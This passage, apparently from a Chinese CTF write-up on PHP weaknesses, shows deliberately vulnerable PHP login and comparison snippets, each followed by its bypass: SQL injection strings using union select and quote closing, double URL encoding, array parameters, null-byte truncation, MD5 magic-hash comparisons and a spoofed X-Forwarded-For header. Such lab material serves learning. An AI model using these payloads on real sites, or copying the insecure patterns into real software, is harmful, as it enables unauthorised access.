class="number">10000</span>));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><a href="http://127.0.0.1/Php_Bug/08.php?password=" target="_blank" rel="noopener">http://127.0.0.1/Php_Bug/08.php?password=</a></p>
<p>删除cookies或者删除cookies的值</p>
<h2 id="密码md5比较绕过"><a href="#密码md5比较绕过" class="headerlink" title="密码md5比较绕过"></a>密码md5比较绕过</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置数据库</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[user] &amp;&amp; <span class="variable">$_POST</span>[pass]) &#123;</span><br><span class="line">    <span class="variable">$conn</span> = mysql_connect(<span class="string">"********, "</span>*****<span class="string">", "</span>********");</span><br><span class="line">    mysql_select_db(<span class="string">"phpformysql"</span>) or die(<span class="string">"Could not select database"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">        die(<span class="string">"Connection failed: "</span> . mysql_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//赋值</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[user];</span><br><span class="line"><span class="variable">$pass</span> = md5(<span class="variable">$_POST</span>[pass]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//sql语句</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// select pw from php where user='' union select 'e10adc3949ba59abbe56e057f20f883e' #</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ?user=' union select 'e10adc3949ba59abbe56e057f20f883e' #&amp;pass=123456</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select pw from php where user='$user'"</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$query</span>) &#123;</span><br><span class="line">    printf(<span class="string">"Error: %s\n"</span>, mysql_error(<span class="variable">$conn</span>));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$query</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pw"];</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="variable">$row</span>[pw]) &amp;&amp; (!strcasecmp(<span class="variable">$pass</span>, <span class="variable">$row</span>[pw]))) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    echo <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    echo(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>用union select来返回一个已知明文的md5，payload：<br>user=’ union select ‘202cb962ac59075b964b07152d234b70’#&amp;pass=123</p>
<h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line">  echo(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  echo <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>?id=%2568ackerDJ</p>
<h2 id="sql闭合绕过"><a href="#sql闭合绕过" class="headerlink" title="sql闭合绕过"></a>sql闭合绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn = mysql_connect(<span class="string">"*******"</span>, <span class="string">"****"</span>, <span class="string">"****"</span>);</span><br><span class="line">    mysql_select_db(<span class="string">"****"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//select user from php where (user='admin')#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//exp:admin')#</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select user from php where (user='$user') and (pw='$pass')"</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$query) &#123;</span><br><span class="line">    printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pw"];</span></span><br><span class="line">  <span class="keyword">if</span>($row[<span class="string">'user'</span>]==<span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: *********** &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($row[<span class="string">'user'</span>] != <span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造exp闭合绕过 admin’)#</p>
<h2 id="X-Forwarded-For绕过指定IP地址"><a href="#X-Forwarded-For绕过指定IP地址" class="headerlink" title="X-Forwarded-For绕过指定IP地址"></a>X-Forwarded-For绕过指定IP地址</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</span></span><br><span class="line"><span class="php">    $cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]))</span></span><br><span class="line"><span class="php">    $cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</span></span><br><span class="line"><span class="php">    $cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">    $cip = <span class="string">"0.0.0.0"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">return</span> $cip;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$GetIPs = GetIP();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"错误！你的IP不在访问列表之内！"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>HTTP头添加X-Forwarded-For:1.1.1.1</p>
<h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="php">$md52 = @md5($a);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span></span><br><span class="line"><span class="php">&#125;&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line">`</span><br></pre></td></tr></table></figure>
<p>==对比的时候会进行数据转换，0eXXXXXXXXXX 转成0了，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行</p>
<h2 id="intval函数四舍五入"><a href="#intval函数四舍五入" class="headerlink" title="intval函数四舍五入"></a>intval函数四舍五入</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_GET[id]) &#123;</span></span><br><span class="line"><span class="php">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span></span><br><span class="line"><span class="php">  mysql_select_db(SAE_MYSQL_DB);</span></span><br><span class="line"><span class="php">  $id = intval($_GET[id]);</span></span><br><span class="line"><span class="php">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>($query[content]);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>构造  id=1024.1212<br>intval函数四舍五入，取值为1024，但if语句中已成功绕过1024的限制</p>
<h2 id="strpos数组绕过NULL与ereg正则-00截断"><a href="#strpos数组绕过NULL与ereg正则-00截断" class="headerlink" title="strpos数组绕过NULL与ereg正则%00截断"></a>strpos数组绕过NULL与ereg正则%00截断</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>方法一： 既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.</p>
<p>方法二： 字符串截断,利用ereg()的NULL截断漏洞，绕过正则过滤 <a href="http://127.0.0.1/Php_Bug/16.php?nctf=1%00#biubiubiu" target="_blank" rel="noopener">http://127.0.0.1/Php_Bug/16.php?nctf=1%00#biubiubiu</a> 错误 需将#编码 <a href="http://127.0.0.1/Php_Bug/16.php?nctf=1%00%23biubiubiu" target="_blank" rel="noopener">http://127.0.0.1/Php_Bug/16.php?nctf=1%00%23biubiubiu</a> 正确</p>
<h2 id="SQL注入or绕过"><a href="#SQL注入or绕过" class="headerlink" title="SQL注入or绕过"></a>SQL注入or绕过</h2><p>地址: <a href="http://chinalover.sinaapp.com/web15/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web15/index.php</a><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123; <span class="regexp">//get</span>_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置</span><br><span class="line">        $str=stripslashes($str); <span class="regexp">//</span>返回一个去除转义反斜线后的字符串（\<span class="string">' 转换为 '</span> 等等）。双反斜线（\\）被转换为单个反斜线（\）。</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">/<span class="regexp">/$query='SELECT * FROM users WHERE name=\''admin\'\' AND pass=\''or 1 #'\';';</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';</span></span><br><span class="line"><span class="regexp">$result=mysql_query($query);</span></span><br><span class="line"><span class="regexp">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span></span><br><span class="line"><span class="regexp">    die('Invalid password!');</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">echo $flag;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>注意上面clean function中的htmlentities()函数，它会把输入字符中的 ’ 或者 ” 转变为html实体，这样一来就无法闭合源代码中的 ’ 了，还有就是，如果php的magic_quotes_gpc是开启状态的话，我们输入的转义符也会被去掉的，不过既然这道题目能做，说明我们是可以使用转义符 \ ，我们解这道题的关键就是使用转义符 \ 来让源代码中<br>‘SELECT * FROM users WHERE name=\’’.$username.’\’ AND pass=\’’.$password.’\’;’<br>$username后面的 ’ 失效，只要 这个 ’ 失效，就能闭合name=后面的 ’ ，要达到这一目的，我们只需要让username=admin \即可，让后使password的值为一个永真式(or 1=1)就可以得到这道题的flag<br>这样提交的数据，会导致源代码中的SQL语句变为：</p>
<p>SELECT * FROM users WHERE name=’admin \’ AND pass=’ or 1=1<br>1<br>注入语句?username=admin \&amp;password=or 1=1#</p>
<h2 id="密码md5比较绕过-1"><a href="#密码md5比较绕过-1" class="headerlink" title="密码md5比较绕过"></a>密码md5比较绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span></span><br><span class="line"><span class="php">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span></span><br><span class="line"><span class="php">  mysql_select_db(SAE_MYSQL_DB);</span></span><br><span class="line"><span class="php">  $user = $_POST[user];</span></span><br><span class="line"><span class="php">  $pass = md5($_POST[pass]);</span></span><br><span class="line"><span class="php">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user=' $user '"</span>));</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">//strcasecmp:0 - 如果两个字符串相等</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>//select pw from ctf where user=’’and 0=1 union select  ‘e10adc3949ba59abbe56e057f20f883e’ #<br>?user=’and 0=1 union select ‘e10adc3949ba59abbe56e057f20f883e’ #&amp;pass=123456</p>
<h2 id="md5-函数-使用数组绕过"><a href="#md5-函数-使用数组绕过" class="headerlink" title="md5()函数===使用数组绕过"></a>md5()函数===使用数组绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'Your password can not be your username.'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>]))</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'Invalid password'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">若为md5($<span class="emphasis">_GET['username']) == md5($_</span>GET[<span class="emphasis">'password'</span>]) 则可以构造： http://127.0.0.1/Php<span class="emphasis">_Bug/18.php?username=QNKCDZO&amp;password=240610708 因为==对比的时候会进行数据转换，0eXXXXXXXXXX 转成0了 也可以使用数组绕过 http://127.0.0.1/Php_</span>Bug/18.php?username[]=1&amp;password[]=2</span><br><span class="line"></span><br><span class="line">但此处是===，只能用数组绕过，PHP对数组进行hash计算都会得出null的空值 <span class="link">http://127.0.0.1/Php_Bug/18.php?username</span>[<span class="string"></span>]=1&amp;password[]=2</span><br></pre></td></tr></table></figure>
<h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($temp)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line"><span class="php">    $one = ord(<span class="string">'1'</span>);  <span class="comment">//ord — 返回字符的 ASCII 码值</span></span></span><br><span class="line"><span class="php">    $nine = ord(<span class="string">'9'</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span></span><br><span class="line"><span class="php">    $number = <span class="string">'3735929054'</span>;</span></span><br><span class="line"><span class="php">    <span class="comment">// Check all the input characters!</span></span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// Disallow all the digits!</span></span></span><br><span class="line"><span class="php">        $digit = ord($temp&#123;$i&#125;);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="comment">// Aha, digit not allowed!</span></span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="string">"flase"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($number == $temp)</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$temp = $_GET[<span class="string">'password'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> noother_says_correct($temp);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span 